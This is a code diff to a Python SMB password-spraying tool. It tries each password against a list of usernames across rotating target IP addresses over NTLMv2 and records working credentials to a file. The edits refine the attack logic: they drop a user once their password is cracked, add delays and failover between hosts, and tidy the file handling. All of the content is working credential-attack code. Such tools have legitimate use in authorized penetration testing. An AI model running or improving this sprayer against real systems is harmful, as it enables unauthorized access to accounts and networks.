@@ -57,7 +57,7 @@ parser.add_argument("-o", "--out", type=str, help="Output file (Default ./out.tx
 args = parser.parse_args()
  
 
-def check_creds(dom, uname, pwd, c_name, ip, out):
+def check_creds(dom, uname, pwd, c_name, ip, out) -> bool:
 
 	conn = SMBConnection(uname, pwd, c_name, ip, domain=dom, use_ntlm_v2=True, is_direct_tcp=True)
  
@@ -69,39 +69,45 @@ def check_creds(dom, uname, pwd, c_name, ip, out):
 		out_file = open(out, "a")
 		out_file.write("\n[+] "+ip+"  -  "+uname+":"+pwd)
 		out_file.flush()
+		return True
 	except:
 		return False
-	return True
 
 
-def pwd_spray(usernames, passwords, ips, domain, window, threshold, out):
+def pwd_spray(usernames: list[str], passwords, ips, domain, window, threshold, out):
 	log_file = open("spraylog", "a")
 	ip_counter = 0
 	pass_counter = 0
+	#reverse usernames to iterate in reverse, to prevent skipping items when removing
+	usernames.reverse()
 	for password in passwords:
 		now = datetime.now()
 		log_file.write("\n * * * "+now.strftime("%H:%M:%S")+" Password: "+password)
 		log_file.flush()
 		print("Password: "+ password)
-		for user in usernames:
+		#iterate users in reverse
+		for user_index in range(len(usernames) - 1, -1 , -1):
+			user = usernames[user_index]
 			if (args.delay > 0):
 				time.sleep(args.delay/1000)
 			now = datetime.now()
-            #if we've hit the end of our ip list, go to the beginning
+			#if we've hit the end of our ip list, go to the beginning
 			if (ip_counter > len(ips)):
 				ip_counter = 0
 
 			#check creds on  the ip address.
 			#192.168.0.1 is a random string value that doesn't matter.
-			success = 0
-			while (success != 1):
+			connect_success = False
+			while not connect_success:
 				if (ip_counter >= len(ips)):
 					ip_counter = 0
 				try:
-					check_creds(domain, user, password, "192.168.0.1", ips[ip_counter], out)
+					if check_creds(domain, user, password, "192.168.0.1", ips[ip_counter], out):
+						#the password worked, remove the user from the list to prevent trying more passwords
+						del usernames[user_index]
 					log_file.write("\n"+now.strftime("%H:%M:%S")+" "+str(ips[ip_counter])+" "+user)
 					log_file.flush()
-					success = 1
+					connect_success = True
 				except:
 					print(f"Failed on {ips[ip_counter]}, removing from list")
 					#something went wrong. try a different host
@@ -139,26 +145,20 @@ def pwd_spray(usernames, passwords, ips, domain, window, threshold, out):
 	return
 
 if args.userfile is not None:
-	unames = open(args.userfile)
-	usernames = unames.read().split("\n")
-	usernames = list(filter(None, usernames))
-	unames.close()
+	with open(args.userfile) as unames:
+		usernames = list(filter(None, unames.read().split("\n")))
 else:
 	usernames = [args.username]
 
 if args.passfile is not None:
-	pwords = open(args.passfile)
-	passwords = pwords.read().split("\n")
-	passwords = list(filter(None, passwords))
-	pwords.close()
+	with open(args.passfile) as pwords:
+		passwords = list(filter(None, pwords.read().split("\n")))
 else:
     passwords = [args.password]
 
 if args.ipfile is not None:
-	ipaddrs = open(args.ipfile)
-	ipaddresses = ipaddrs.read().split("\n")
-	ipaddresses = list(filter(None, ipaddresses))
-	ipaddrs.close()
+	with open(args.ipfile) as ipaddrs:
+		ipaddresses = list(filter(None, ipaddrs.read().split("\n")))
 else:
     ipaddresses = [args.ip]
 
